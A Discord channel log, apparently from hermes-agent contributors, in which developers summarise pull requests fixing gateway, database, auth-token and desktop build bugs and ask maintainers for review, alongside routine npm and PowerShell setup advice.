      main, docs updated, and the Feishu suite passes locally (432 passed, 1 skipped — the one known flake is pre-existing order pollution, unrelated and documented in the PR). New tests cover
      the sender notice, self-identity injection, the structured-at lift, and the no-inject behavior. Also validated live with a real bot↔bot multi-turn exchange, including a graceful
      model-driven stop.
    
      PR: https://github.com/NousResearch/hermes-agent/pull/42038
    
      No rush — would love a look from anyone on the gateway/channels side when there's a moment. CI hasn't been approved to run yet (first-time contributor), so a workflow approval alone would
      already help. Happy to adjust the prompt guidance or the no-inject posture if you'd prefer a different approach.
    [embed] feat(feishu): bot-to-bot @mention collaboration with model-driven l... https://github.com/NousResearch/hermes-agent/pull/42038

[2026-06-10T15:48:12.801000+00:00] kyssta69 (id=1514295128179605514)
    https://github.com/NousResearch/hermes-agent/pull/43526
    
    **Problem**: Memory tool 'remove' action with old_text arg was rejected as missing even when provided. Schema did not list old_text in required fields, so LLM tool-calling layers dropped it before invocation. Added old_text to the MEMORY_SCHEMA required parameters list.
    
    https://github.com/NousResearch/hermes-agent/pull/43486
    
    **Problem**: Feishu messages showed broken Markdown rendering with literal backslash-escaped characters. The _escape_markdown_text function was pre-escaping all special characters with backslashes. Feishu's renderer expects raw Markdown, so the escaping was removed.
    
    https://github.com/NousResearch/hermes-agent/pull/43590
    
    **Problem**: Telegram forum topic final replies showed raw Markdown like **bold** and backticks instead of rendered text. When MarkdownV2 parsing failed during overflow split, the fallback sent raw text without parse_mode. Now strips formatting markers before sending as plain text.
    
    https://github.com/NousResearch/hermes-agent/pull/43594
    
    **Problem**: QQ group responses were lost when agent took too long and the reply_to msg_id expired. The adapter retried 3 times with the same expired msg_id and gave up. Now detects msg_id expiration errors and falls back to sending as a standalone message.
    
    
    https://github.com/NousResearch/hermes-agent/pull/43596
    
    **Problem**: On macOS, /restart stopped the gateway but never relaunched it. The detached restart path skipped setting the exit code, so launchd saw exit code 0 and treated it as success (not restarting). Now forces exit code 75 on macOS so launchd revives the process.

[2026-06-10T16:16:32.276000+00:00] cristianmgm7 (id=1514302256294658048)
    👋 Opened a PR to add **Carbon Voice** as a native messaging platform: **https://github.com/NousResearch/hermes-agent/pull/43226**
    
    Carbon Voice is a voice-first platform (it transcribes inbound voice to text and can read replies back as voice memos), so it's text-in/text-out from Hermes' side. The adapter connects over Socket.IO with a REST polling fallback — no public webhook needed.
    
    It follows the `gateway/platforms/qqbot/` subpackage pattern and walks the full `ADDING_A_PLATFORM.md` checklist:
    - `Platform.CARBONVOICE` enum + factory + auth maps + setup wizard
    - `python-socketio` added to the `[messaging]` extra (httpx already core), `uv.lock` regenerated
    - env-vars-only config (`CARBONVOICE_PAT` auto-enables it)
    - prompt hints, toolset, cron delivery, send-message tool, status display, user-guide docs
    - 16 tests, all passing
    
    Verified end-to-end in a container build. auto-enables from the PAT, connects (`✓ carbonvoice connected`), auto-detects the owner (deny-by-default access control), and replies via the configured model. No changes to existing platforms' behavior.
    
    One small note for maintainers: the **env auto-enable step** (`_apply_env_overrides` → enable the platform when its token env is set) isn't an explicit item in `ADDING_A_PLATFORM.md`, but the platform won't start without it. might be worth adding to the guide.
    
    Would love a review!,  happy to adjust anything to match house conventions. 🙏

[2026-06-10T18:45:44.210000+00:00] jw_mushroom_man (id=1514339803427111074)
    https://github.com/NousResearch/hermes-agent/pull/43720
    
    Fixes a desktop startup/WebSocket auth failure where the local dashboard serves a different session token than the one the Electron main process generated when spawning the backend.
    
    The old desktop path used the spawn-time token for renderer state and /api/ws?token=.... In the failure mode seen on Windows, GET /api/status still returned 200, but the rendered dashboard HTML injected a different window.__HERMES_SESSION_TOKEN__. The UI then attempted the WebSocket handshake with the stale token and the gateway rejected it, surfacing as Could not connect to Hermes gateway or follow-on renderer IPC errors after boot.
    [embed] Fix desktop WebSocket auth with served dashboard token by lEWFkRAD ... https://github.com/NousResearch/hermes-agent/pull/43720

[2026-06-10T22:24:05.458000+00:00] aleksandr_1 (id=1514394754044137593)
    **1. fix(profiles): use unique tmp file in set_active_profile to prevent parallel-writer clobber.**
    set_active_profile() used path.with_suffix(".tmp") producing a constant active_profile.tmp shared by all writers. Two processes (e.g. web dashboard + CLI) writing simultaneously would clobber each other silently — the final os.replace is atomic but the tmp write window was unprotected. Replaced with tempfile.mkstemp(dir=..., prefix=".active_profile_") so each caller owns its own unique tmp file. Cleanup on failure via except BaseException. 
    https://github.com/NousResearch/hermes-agent/pull/43535
    
    **2. fix(state): retry _connect_and_init when concurrent repair is in progress.**
    When two processes open SessionDB simultaneously on a malformed state.db, the first repairs it via _claim_repair_attempt while the second received an immediate sqlite3.DatabaseError instead of waiting. Added a retry loop reusing the existing _execute_write jitter pattern (_WRITE_MAX_RETRIES, 20-150ms) so the losing caller waits for repair to complete and retries the connection instead of surfacing "Session database not available". https://github.com/NousResearch/hermes-agent/pull/43742

[2026-06-10T22:26:45.953000+00:00] sworntech (id=1514395427208691762)

[2026-06-11T08:20:00.889000+00:00] kyssta69 (id=1514544723191402598)
    https://github.com/NousResearch/hermes-agent/pull/44066
    
    **Problem**: Users running the holographic memory provider see their memory_store.db corrupted with TLS ciphertext after gateway restarts. HolographicMemoryProvider.shutdown() dropped its MemoryStore reference without closing the sqlite3.Connection, letting the DB fd be reclaimed by GC at a non-deterministic time, which allows the kernel to recycle it for a TLS socket (same class as #29507). The fix explicitly calls MemoryStore.close() before dropping the reference so the connection is finalized deterministically on the caller's thread.

[2026-06-11T08:21:51.545000+00:00] yerts (id=1514545187316305930)

    [reply to zygimantas_98838 msg=1514530121787379772]

[2026-06-11T08:46:18.401000+00:00] kyssta69 (id=1514551339756290070)
    https://github.com/NousResearch/hermes-agent/pull/44131
    
    **Problem**: Stateless OpenAI-compatible clients (Open WebUI, LibreChat) fork conversations after compaction because they re-supply the old session_id on every request, and the API server loads the ended parent session instead of resolving to the latest descendant. The fix calls resolve_resume_session_id() on the client-supplied X-Hermes-Session-Id in the chat completions endpoint, walking the parent-child chain forward to find the session that actually holds messages.

[2026-06-11T08:50:06.956000+00:00] kyssta69 (id=1514552298385182800)
    https://github.com/NousResearch/hermes-agent/pull/44148
    
    **Problem**: Stream retry after a timeout always fails for Anthropic-mode providers like minimax because _replace_primary_openai_client unconditionally tries to rebuild the OpenAI client, which has no api_key in _client_kwargs for these providers. The fix adds a guard to skip the rebuild when client is None and _client_kwargs lacks an api_key, preventing the false error and allowing the retry logic to proceed correctly.

[2026-06-11T08:56:51.099000+00:00] kyssta69 (id=1514553993484042282)
    https://github.com/NousResearch/hermes-agent/pull/44151
    
    **Problem**: Clicking an older chat in the desktop/TUI app fails with 'No LLM provider configured' when the session only stored a bare billing_provider like 'custom' instead of a full provider id. The fix skips setting provider_override for bare billing classes (custom, auto, openrouter) without a base_url, so the system falls back to the default provider resolution instead of passing an unroutable id to the agent.

[2026-06-11T10:47:43.107000+00:00] teknium (id=1514581894027804672)
    ```    Pulled the paste and verified against current main in the worktree. Verdict: this isn't reproducible as a hermes-agent bug — the update itself succeeded and the degradation path behaved as designed. Report:
        
        What the log shows
        1. npm ci failed (lock file's @types/node@24.13.1 does not satisfy @types/node@24.13.2) → our deterministic installer (hermes_cli/main.py:4546) fell back to npm install, by design.
        2. Fallback "succeeded" but only added 788 packages — a clean npm ci on current main installs 1483. So roughly half the tree, including the web workspace's own deps, never landed.
        3. Web build then failed with hundreds of TS2307s (vite, @nous-research/ui, lucide-react, react-router-dom all unresolvable) — that's the missing-node_modules signature, not a code bug. Update served the stale dist as fallback (intentional, issue #23817).
        
        Premise check against main
        - @types/node@24.13.2 appears nowhere in the repo — every workspace pins ^24.12.0 and the committed lockfile has 24.13.1. The mismatch comes from their checkout (they're on a fork; something locally pinned/rewrote a manifest).
        - I ran npm ci --dry-run on current main here: clean, lockfile fully in sync.
        - Their npm isn't stock: the allowScripts / npm approve-scripts --allow-scripts-pending warnings are a script-policy wrapper (Socket-style safe-npm or similar). With pending-unapproved packages like esbuild and node-pty, that wrapper is the most likely reason the install came up ~700 packages short — which is exactly what then broke tsc && vite build.
        
        Suggested reply to the reporter
        
        cd ~/hermes-agent
        git checkout -- package-lock.json        # restore upstream lockfile
        npm approve-scripts --allow-scripts-pending   # or temporarily bypass your npm policy wrapper
        npm ci
        npm run build -w web
        
        Then hermes update should go green end to end. The "serving stale dist" line means nothing else was harmed — agent/CLI updated fine, only the dashboard UI is stale.```
    [reply to minddragon msg=1514578025163919520]

[2026-06-11T15:13:24.225000+00:00] aleksandr_1 (id=1514648755922534490)
    **1. fix(state): catch FK violation in append_message when session deleted concurrently.**
    append_message() raised sqlite3.IntegrityError when a session was deleted between the caller's read and the INSERT — dashboard bulk-delete or prune racing with an inbound gateway event. Wrapped the INSERT in try/except sqlite3.IntegrityError, logs DEBUG and returns None. Fix scoped to append_message only, not _execute_write, to avoid masking integrity errors in other write paths. https://github.com/NousResearch/hermes-agent/pull/44266
    
    **2. fix(mcp): pass safe_env directly to StdioServerParameters to prevent empty-dict inheriting parent env.**
    _build_safe_env returns {} when os.environ lacks _SAFE_ENV_KEYS (systemd, minimal Docker, stripped CI env). Old ternary env=safe_env if safe_env else None collapsed {} to None — MCP SDK treats None as "inherit parent env", leaking OPENAI_API_KEY / ANTHROPIC_API_KEY / GITHUB_TOKEN etc. to stdio subprocess. Fixed by passing safe_env directly; regression guard added in _run_stdio test. https://github.com/NousResearch/hermes-agent/pull/44291

[2026-06-12T07:07:41.717000+00:00] godsboy7777 (id=1514888911250259989)
    Hey Teknium, could you please review this Mem0 Hermes Agent PR when you get a gap?
    
    PR: https://github.com/NousResearch/hermes-agent/pull/38429
    
    ## Why it matters
    
    Hermes' built-in Mem0 memory provider currently writes memories with both `user_id` and `agent_id` for attribution, but reads them back using only `user_id`.
    
    Relevant upstream file:
    https://github.com/NousResearch/hermes-agent/blob/main/plugins/memory/mem0/__init__.py
    
    The practical problem is that Mem0 Platform can store agent-scoped records under `{ user_id, agent_id }`, so a plain `{ user_id }` read can miss memories that Hermes itself saved through the agent.
    
    That makes recall incomplete even though Mem0 is configured and working correctly.
    
    ## Why this belongs in Hermes Agent, not Mem0 upstream
    
    * The bug is in Hermes' Mem0 provider read logic.
    * Hermes chooses the filters it sends to Mem0.
    * Mem0 is not failing to store or search records.
    * The provider should read both legacy user-only records and current user+agent records.
    
    ## What the PR changes
    
    The PR fixes this by changing Hermes' `_read_filters()` to use an OR filter covering both shapes:
    
    ```json
    {
      "user_id": "..."
    }
    ```
    
    and:
    
    ```json
    {
      "user_id": "...",
      "agent_id": "..."
    }
    ```
    
    It also adds tests here:
    https://github.com/NousResearch/hermes-agent/pull/38429/files
    
    This is a narrow compatibility fix for Hermes' bundled provider, not a new core tool or speculative feature.
    
    It preserves existing user-only recall while restoring recall for agent-attributed memories.
    
    ## Current live impact
    
    We are carrying this as a local Hermes patch right now because our live Hermes setup misses agent-scoped Mem0 memories without it.
    
    Would be good to upstream it so others using `agent_id` do not silently lose recall.
    
    ## Extra context
    
    Hermes' own bundled Mem0 provider documents both config fields in:
    
    ```text
    plugins/memory/mem0/README.md
    ```
    
    Those fields are:
    
    * `user_id`
    * `agent_id`
    
    The provider's write path already uses both values for attribution. The mismatch is only on the read path.
    
    Current behaviour is effectively:
    
    1. Hermes saves memory as:
    
    ```json
    {
      "user_id": "dewaldt",
      "agent_id": "hermie"
    }
    ```
    
    2. Later Hermes searches or lists memories with:
    
    ```json
    {
      "user_id": "dewaldt"
    }
    ```
    
    3. Depending on how Mem0 scopes those records, that can omit memories Hermes itself saved.
    
    That makes the feature look flaky from the user side:
    
    * `mem0_conclude` works
    * Mem0 dashboard / API has the records
    * `mem0_profile` / `mem0_search` can still miss some of them
    
    The PR fixes the read side to match the write side.
    
    PR again:
    https://github.com/NousResearch/hermes-agent/pull/38429
    
    Relevant upstream file again:
    https://github.com/NousResearch/hermes-agent/blob/main/plugins/memory/mem0/__init__.py
    
    This should be safe because it does not remove user-only reads.
    
    It broadens reads to include both:
    
    * Older / plain user-scoped memories
    * Newer / current agent-attributed memories
    
    So it is backwards-compatible and restores consistency between write and read behaviour.
    
    Thanks.
    [embed] fix(mem0): read agent-attributed memories by GodsBoy · Pull Reques... https://github.com/NousResearch/hermes-agent/pull/38429
    [embed] hermes-agent/plugins/memory/mem0/__init__.py at main · NousResearc... https://github.com/NousResearch/hermes-agent/blob/main/plugins/memory/mem0/__init__.py
    [embed] fix(mem0): read agent-attributed memories by GodsBoy · Pull Reques... https://github.com/NousResearch/hermes-agent/pull/38429/files

[2026-06-12T09:44:30.165000+00:00] hughjm (id=1514928373141602324)
    Hey <@387972437901312000> , I opened a small follow-up for the macOS Desktop /codex-runtime PATH issue:
    
    Issue: https://github.com/NousResearch/hermes-agent/issues/44813
    PR: https://github.com/NousResearch/hermes-agent/pull/44814
    
    Context:
    - #35613 / #42653 fixed the terminal/gateway subprocess PATH by appending missing POSIX sane PATH entries.
    - #41385 / #41389 covers the Desktop backend path for Hermes-managed Node binaries like ~/.hermes/node/bin/codex.
    - I hit the remaining Desktop case where Codex is installed via Homebrew at /opt/homebrew/bin/codex. The Desktop dashboard backend PATH includes Hermes node/venv + Apple default paths, but still misses /opt/homebrew/bin, so /codex-runtime on fails with “codex CLI not found”.
    
    The PR factors Desktop backend env construction into a small tested helper:
    - prepends ~/.hermes/node/bin and the venv bin;
    - appends missing POSIX sane PATH entries such as /opt/homebrew/bin and /opt/homebrew/sbin;
    - preserves caller precedence and dedupes entries;
    - preserves Windows PATH casing/delimiters.
    
    Local checks:
    - node --check backend-env/main/test files: passed
    - node --test electron/backend-env.test.cjs electron/backend-probes.test.cjs: 12 passed
    - npm run test`:desktop:`platforms: 170 passed, 1 skipped
    
    This is intended as a complement to #41389, borrowing the PATH-completion behavior from #42653 for the Desktop backend path.
    [embed] [Bug]: Desktop backend PATH still misses Homebrew bins for /codex-r... https://github.com/NousResearch/hermes-agent/issues/44813
    [embed] fix(desktop): complete backend PATH for Homebrew Codex by y0shua1ee... https://github.com/NousResearch/hermes-agent/pull/44814

[2026-06-12T09:55:57.125000+00:00] godsboy7777 (id=1514931254460678324)
    Hey <@387972437901312000>, small follow-up to the Telegram delivery fixes you merged in #43761:
    
    PR #44783 makes the gateway's `"Suppressing normal final send"` log line carry its own evidence instead of three bare booleans.
    
    It now includes:
    
    * Payload lengths
    * Short SHA-256 digests
    * Message ID
    * Overflow flag
    
    This came out of triaging a live "did the user actually see the full reply?" incident on our deployment.
    
    The logs could not answer it. We had to pull the session DB to prove the model had simply stopped normally.
    
    With this change, a digest match on that one log line settles it.
    
    That is exactly the log distinction #27942's acceptance criteria ask for, and it makes false positives like #29200 provable or refutable from logs alone.
    
    Scope:
    
    * Zero behavior change
    * Suppression condition is byte-identical to `main`
    * Composition helper cannot raise
    * Message content never hits logs
    * 11 new tests
    * All CI green on the first run
    * Mergeable
    
    PR: https://github.com/NousResearch/hermes-agent/pull/44783
    [embed] fix(gateway): log delivery facts when suppressing the final send by... https://github.com/NousResearch/hermes-agent/pull/44783

    https://github.com/NousResearch/hermes-agent/pull/44874
    
    **Problem**: read_file and search_files reported 'File not found' for existing files when the Docker container was still starting up. The wc -c existence probe failed with a non-zero exit code from the transport layer, which was treated as a missing file. The fix runs a health probe to disambiguate environment failures from genuine missing files.
    
    
    https://github.com/NousResearch/hermes-agent/pull/44870
    
    **Problem**: Gateway warm sessions accumulated merged newline-joined user blobs because repair_message_sequence shrunk the message list but the DB-write cursor was not clamped. The turn-end flush skipped the assistant/tool chain. The fix clamps the cursor after repair and adds a safety guard in _flush_messages_to_session_db.

[2026-06-12T13:16:06.823000+00:00] kyssta69 (id=1514981626785042555)
    https://github.com/NousResearch/hermes-agent/pull/44917
    
    **Problem**: WAL checkpoint corruption: the /compress and vacuum commands use TRUNCATE mode which can corrupt state.db if it fails mid-operation.
    The bare except Exception: pass silently swallowed errors, so a truncated WAL with unflushed data caused disk I/O errors on next connection.
    Changed periodic checkpoint to PASSIVE mode (non-destructive) and added logging so failures are visible instead of silent.
    [embed] fix(state): use PASSIVE WAL checkpoint to prevent corruption (#4479... https://github.com/NousResearch/hermes-agent/pull/44917

[2026-06-12T13:17:18.827000+00:00] kyssta69 (id=1514981928791703602)
    https://github.com/NousResearch/hermes-agent/pull/44920
    
    **Problem**: Codex OAuth refresh chain dying: when a ChatGPT credential hit a 429 quota error, the pool skipped it entirely during a multi-day cooldown window.
    The OAuth refresh token was never rotated, so by the time the cooldown expired the session had expired and the credential was permanently dead.
    Added refresh logic for OAuth entries even during exhaustion cooldown to keep the token chain alive.
    [embed] fix(auth): refresh OAuth tokens during exhaustion cooldown (#44799)... https://github.com/NousResearch/hermes-agent/pull/44920

[2026-06-12T13:20:17.515000+00:00] kyssta69 (id=1514982678263500800)
    https://github.com/NousResearch/hermes-agent/pull/44923
    
    **Problem**: Curator LLM loop on symlinked skills: 26 symlinked lark-* skills all appeared as separate candidates, causing the LLM to enter a 4-hour consolidation loop making 811 API calls and consuming 91M tokens.
    The rglob followed symlinks, so each symlink was counted as a separate skill. Added deduplication by resolved symlink target.
    Also capped max_iterations from 9999 to 200 to prevent future runaway loops (typical pass is 50-100 calls).
    [embed] fix(curator): deduplicate symlinked skills and cap iteration limit ... https://github.com/NousResearch/hermes-agent/pull/44923

    Pushed two kanban dispatcher fixes, would love a sneak peek if anyone's got a sec 👀
    
    #44909 — reclaim releases a task's claim even when the worker kill didn't land (cgroup-throttled D-state workers can't take SIGKILL), so duplicate workers pile up with no bound. Now it holds the claim and retries. https://github.com/NousResearch/hermes-agent/pull/44909
    
    #44919 — the embedded dispatcher has no singleton guard, so multiple gateways each sweep every board and corrupt the shared SQLite DBs. Adds a machine-global flock. Closes #41448. https://github.com/NousResearch/hermes-agent/pull/44919

[2026-06-12T14:42:30.022000+00:00] kkurottal6611 (id=1515003366697341079)
    When HERMES_HOME is unset, `_resolve_log_path()` hardcoded `~/.hermes` instead of using the platform-native default from `get_hermes_home()` (`%LOCALAPPDATA%\hermes` on native Windows) — so audit logs landed in a different tree than every other Hermes state file. The local copy also ignored the context-local profile override.
    
    The fix delegates to `get_hermes_home()`, the documented single source of truth. Added 2 regression tests (platform-native + `~/.hermes` fallback); all 13 dashboard_auth test suites pass (248 passed)
    
    Feedback welcome! 🙏 https://github.com/NousResearch/hermes-agent/pull/44984
    [embed] fix(dashboard-auth): stop hardcoding ~/.hermes for audit log path b... https://github.com/NousResearch/hermes-agent/pull/44984

    https://github.com/NousResearch/hermes-agent/pull/44870
    
    **Problem**: Session DB turn-end flush drops assistant messages after repair_message_sequence compacts the message list.
    When repair_message_sequence merges consecutive user messages or drops stray tools, the messages list shrinks but the flush cursor (_last_flushed_db_idx) was not clamped, causing the turn-end flush to skip persisting the assistant/tool chain.
    Clamped the cursor after repair and added a safety guard in _flush_messages_to_session_db to prevent cursor overshooting.

[2026-06-12T16:38:08.442000+00:00] suhas2391 (id=1515032468540096703)
    **PR #45055** — fix(cli): show all session sources in /sessions list
    🔗 https://github.com/NousResearch/hermes-agent/pull/45055
    
    **The bug (#44964):** The `/sessions` slash command in the interactive CLI (and bare `/resume` commands) would filter list_sessions_rich on source="cli", causing TUI and WhatsApp/Telegram/Slack sessions to be hidden from the in-chat resume lists.
    
    **The fix:** 
    • Removed the restrictive `source="cli"` filter from `_list_recent_sessions` in `cli.py` (keeping the internal `exclude_sources=["tool"]` clean-up filter).
    • Added a unit test to verify that list_sessions_rich is called without filtering by source.
    • All CLI and TUI test suites are green! ✅
    [embed] fix(cli): show all session sources in /sessions list by suhas-svg ... https://github.com/NousResearch/hermes-agent/pull/45055

[2026-06-12T16:45:33.404000+00:00] theoveo (id=1515034334845997269)
    Hello, quick context for PR #44985.
    
    We ran into an issue with Hermes Desktop when the dashboard is exposed remotely with the browser/password auth gate enabled.
    
    Concrete setup:
    - dashboard bound on a non-loopback / remote interface
    - auth gate enabled to protect browser access
    - Hermes Desktop still uses the existing session token flow for API calls and WebSockets
    
    Result: browser login works, but Hermes Desktop can get blocked because the auth gate no longer accepts the Desktop token path (`X-Hermes-Session-Token` for HTTP API calls and `?token=...` for WebSockets).
    
    The PR keeps browser auth in place for the web dashboard, while also allowing Hermes Desktop to keep authenticating with its existing session token. This lets both use cases coexist on the same backend:
    - browser dashboard protected by cookie/auth gate
    - Desktop remote access via session token
    
    We initially fixed this in our custom overlay, but that overlay drifts quickly from upstream. So I preferred upstreaming the minimal behavior with regression tests instead of continuing to maintain a large local patch.
    
    Local validation:
    - dedicated Desktop token + auth gate test: 2 passed
    - existing web_server test + new regression test: 3 passed
    - py_compile OK
    - git diff --check OK
    
    PR: https://github.com/NousResearch/hermes-agent/pull/44985
    [embed] fix(dashboard): accept Desktop token behind auth gate by leprincep3... https://github.com/NousResearch/hermes-agent/pull/44985

[2026-06-12T23:11:33.272000+00:00] aleksandr_1 (id=1515131474372989028)
    **Gateway was stuck in a permanent crash loop under systemd.** 
    On restart, the new process saw the old one as "alive" even though it was already dead (zombie process), waited 15 seconds, failed to kill it, exited with code 1, systemd respawned, and the cycle repeated. I fixed it by adding a /proc/<pid>/stat check before os.kill: if the process is in state Z (zombie), immediately return False. Five lines of code that break the deterministic loop. Issue: https://github.com/NousResearch/hermes-agent/issues/42126 
    
    **PR:** https://github.com/NousResearch/hermes-agent/pull/44898
    
    **Have a great weekend everyone!**<:o7:1151261546111053924>

[2026-06-13T06:27:49.183000+00:00] frowtek (id=1515241264101068831)
    _resolve_cwd() in agent/coding_context.py fell back to
    Path(os.getcwd()) when resolve_agent_cwd() raised — but
    resolve_agent_cwd() raises because os.getcwd() failed (a deleted
    CWD with no TERMINAL_CWD/session override). The fallback re-invoked the
    same failing syscall and propagated out of resolve_runtime_mode() and
    build_coding_workspace_block(), crashing prompt build.
    
    Path.resolve() can also call os.getcwd() for absolute paths, so
    _git_root, _marker_root, _home, and the worktree probe were
    additional crash sites.
    
    https://github.com/NousResearch/hermes-agent/pull/45423
    [embed] fix(agent): guard coding-context cwd fallback against getcwd errors... https://github.com/NousResearch/hermes-agent/pull/45423

[2026-06-13T10:42:49.288000+00:00] vampyren (id=1515305437392535603)
    Not ssure this is the right place so please tell me if i should post it elsewhere. This is  a Heads up: 
    the Hermes npm install/update warnings are getting louder and look like dependency maintenance drift, not just local noise.
        
        On Node v22.22.2 / npm 11.16.0 I’m seeing:
        - npm audit reports Vite/esbuild high-severity advisories and a Joi moderate advisory unless Vite/esbuild/Joi are bumped.
        - npm audit fix currently crashes in the workspace with Cannot read properties of null (reading 'isDescendantOf'), so the safe path was targeted dependency bumps rather than audit fix --force.
        - npm install repeatedly warns about pending install scripts via npm’s allow-scripts flow: agent-browser, electron, electron-winstaller, node-pty, esbuild, unicode-animations, etc. We probably need a project-level policy for which scripts are intentionally allowed.
        - @icons-pack/react-simple-icons@13.13.0 now requires Node >=24 and pnpm >=10, while Hermes currently runs fine on Node 22/npm. Either the supported Node version should be bumped/documented, or that dependency should be pinned/replaced.
        - Desktop install also emits deprecated dependency warnings: inflight, rimraf v2, glob v7, boolean, rcedit.
        
        I locally tested a safe patch without --force:
        - Vite -> ^8.0.16 in web + bootstrap-installer
        - esbuild -> ^0.28.1 in ui-tui + @hermes/ink
        - lockfile updated so Joi resolves cleanly
        - npm audit now reports 0 vulnerabilities
        - web build, ui-tui typecheck/build, bootstrap-installer build, and desktop typecheck all pass
        
        I did not approve install scripts or downgrade the Node-24 icon package warning because those need an upstream/project decision.

    Fixed a fresh-clone build blocker in the desktop app (#45551 / #45559):
    apps/shared/tsconfig.json was targeting ES2022 but the source uses Array.findLast() / Array.findLastIndex() (ES2023) — bumped target/lib to ES2023.
    Also @assistant-ui/store@0.2.16 imports from @assistant-ui/tap/react-shim but tap 0.5.10 doesn't export it. Instead of patching node_modules or bumping tap (cascading type errors), added a Vite resolve alias pointing it to react directly — consistent with the existing dedup aliases in vite.config.ts.
    All CI checks passed. PR: https://github.com/NousResearch/hermes-agent/pull/45559

[2026-06-13T12:04:09.857000+00:00] kyssta69 (id=1515325907982880918)
    https://github.com/NousResearch/hermes-agent/pull/45570
    
    **Problem**: Users received doubled and interleaved messages for hours after gateway restart because auto-resume and inbound message handler both created separate AIAgent instances for the same session.
    The auto-resume task was created asynchronously, so between task creation and execution, the inbound handler also passed the 'not running' check and created a duplicate agent.
    The fix atomically claims the session in _running_agents before the auto-resume task starts, blocking the inbound handler from creating a duplicate.
    [embed] fix(gateway): prevent duplicate agent instances on auto-resume race... https://github.com/NousResearch/hermes-agent/pull/45570

[2026-06-13T12:31:29.856000+00:00] theoveo (id=1515332786636984491)
    <@387972437901312000> I reproduced the Desktop remote issue against a clean upstream Hermes backend, without our custom stack.
    
    PR: https://github.com/NousResearch/hermes-agent/compare/main...leprincep35700:hermes-agent:fix/dashboard-desktop-token-gated  
    Related issue/context: https://github.com/NousResearch/hermes-agent/issues/42139
    
    What I tested:
    
    - Fresh isolated upstream Hermes Docker build
    - Dashboard exposed on LAN
    - `/api/status` returns `200`
    - `gateway_running=true`
    - API server is connected
    - Docker port is bound on `0.0.0.0`
    - Also tested without BasicAuth/proxy auth
    
    Result: Hermes Desktop still shows `Could not reach gateway`, even though the backend is reachable and healthy.
    
    So this does not look like a network/port/Docker problem. It looks like the Desktop remote auth/handshake contract is incompatible with the current gated self-hosted dashboard path.
    
    The PR fixes the narrow compatibility gap: when dashboard auth gate is active, it also accepts the Desktop session token for native Desktop clients:
    
    - HTTP API calls via `X-Hermes-Session-Token`
    - WebSocket via `?token=...`
    
    Browser auth/cookie/OAuth remains gated; this only restores the native Desktop token path.
    
    Validation:
    txt
    tests/hermes_cli/test_dashboard_desktop_token_gated.py
    2 passed
    Based on the reproduction, the PR seems correctly scoped: vanilla upstream backend is healthy but Desktop cannot connect without this token compatibility path.
    [embed] Comparing NousResearch:main...leprincep35700:fix/dashboard-desktop-... https://github.com/NousResearch/hermes-agent/compare/main...leprincep35700:hermes-agent:fix/dashboard-desktop-token-gated
    [embed] Gated dashboard mode: endpoints calling _require_token() 401 cookie... https://github.com/NousResearch/hermes-agent/issues/42139

[2026-06-13T13:24:23.441000+00:00] jw_mushroom_man (id=1515346097617371236)
    **Hermes PRs — last 12 hours** 
    
    **#45610 — fix(windows): harden gateway scheduled task**
    Makes the Windows gateway task survive reboot/login reliably: installed from XML (logon delay, start-when-available, battery-safe, no 72h limit, restart-on-failure) and using the uv-safe detached-python launcher so it won't respawn a console python. Fixes #45599.
    `https://github.com/NousResearch/hermes-agent/pull/45610`
    
    **#45604 — fix(gateway): exclude delegate children from TUI active-session list**
    Stops delegated subagent "watch" sessions from leaking into the switchable active-session list, where one could silently become your current conversation and swallow prompts meant for the parent.
    `https://github.com/NousResearch/hermes-agent/pull/45604`
    
    **#45373 — fix(web): require explicit Parallel backend selection**
    A fresh install with no web config or creds no longer silently routes web_search/web_extract to Parallel's anonymous hosted MCP — it falls through to the normal setup error unless you opt in. Fixes #45058.
    `https://github.com/NousResearch/hermes-agent/pull/45373`
    
    **#45366 — fix(gateway): notify agent only on successful process exit**
    Background terminal jobs with notify_on_complete only inject a follow-up turn on a clean exit; failed/killed/unknown-exit ones are logged and dropped instead of polluting the chat. Fixes #45352.
    `https://github.com/NousResearch/hermes-agent/pull/45366`
    
    **#45351 — fix(agent): reserve output tokens in compression threshold**
    Proactive context compression now subtracts the request's reserved output budget (e.g. max_tokens=65536) from the context window before applying its threshold, so it compresses in time instead of overflowing context. Fixes #43547.
    `https://github.com/NousResearch/hermes-agent/pull/45351`
    
    Also updated: **#44356 — feat(excel): Excel sidecar** picked up a native conditional_format action + a reliability fix so medium multi-action builds stop emitting invalid JSON.
    `https://github.com/NousResearch/hermes-agent/pull/44356`

[2026-06-13T13:41:29.330000+00:00] teknium (id=1515350400507842600)
    ```    For Windows, don’t use the Linux symlink line. ln -sf ... is for bash/Linux/macOS, and venv/bin/hermes is also the Linux venv path.
        
        Native Windows paths are under venv\Scripts.
        
        From the cloned repo root in PowerShell:
        
        powershell
        Run the clone's Hermes directly
        .\venv\Scripts\hermes.exe doctor
        .\venv\Scripts\hermes.exe chat -q "Hello"
        .\venv\Scripts\hermes.exe desktop
        
        
        If that venv doesn’t exist yet, set it up natively:
        
        powershell
        from the cloned hermes-agent repo
        uv venv venv --python 3.11
        .\venv\Scripts\python.exe -m pip install -e ".[all,dev]"
        .\venv\Scripts\hermes.exe doctor
        
        
        Or, to avoid the global installed hermes entirely:
        
        powershell
        .\venv\Scripts\python.exe -m hermes_cli.main doctor
        .\venv\Scripts\python.exe -m hermes_cli.main desktop
        
        
        If they want hermes to mean the clone inside that PowerShell session:
        
        powershell
        $env:Path = "$PWD\venv\Scripts;$env:Path"
        hermes doctor
        hermes desktop
        
        
        That only affects the current terminal. To make it persistent, add the clone’s venv\Scripts directory before the installed Hermes entry in the Windows User PATH.
        
        Also: setup-hermes.sh is the bash/Linux helper. On native Windows the official installer path is scripts\install.ps1, but for a dev clone the cleanest route is the uv venv + pip install -e ".[all,dev]" flow above.```
    [reply to enderlook msg=1515328453165973584]

[2026-06-13T13:47:01.611000+00:00] jw_mushroom_man (id=1515351794195234957)
    Dug into it. I think we're both seeing real behavior: the task uses a LogonTrigger + InteractiveToken (the gateway needs a logged-in session for the Windows computer_use backend), so it only comes up after a user logs in. My boxes auto-login (AutoAdminLogon=1), so it survives reboot for me, yours probably doesn't auto-login, so it sits at the lock screen and never fires. StartWhenAvailable doesn't help here since it only rescues missed time-based schedules, not logon triggers.
    
    So the PR is really "harden the logon task" (battery-safe, kill the 72h exec limit, restart-on-failure, stop the minute-repeat churn) all still worth having, but it can't deliver true unattended reboot survival on a box without auto-login. Two honest options: reframe it as a logon-task hardening + document that headless reboot survival needs auto-login, or add an opt-in service/boot-trigger mode for headless machines (which would disable computer_use).

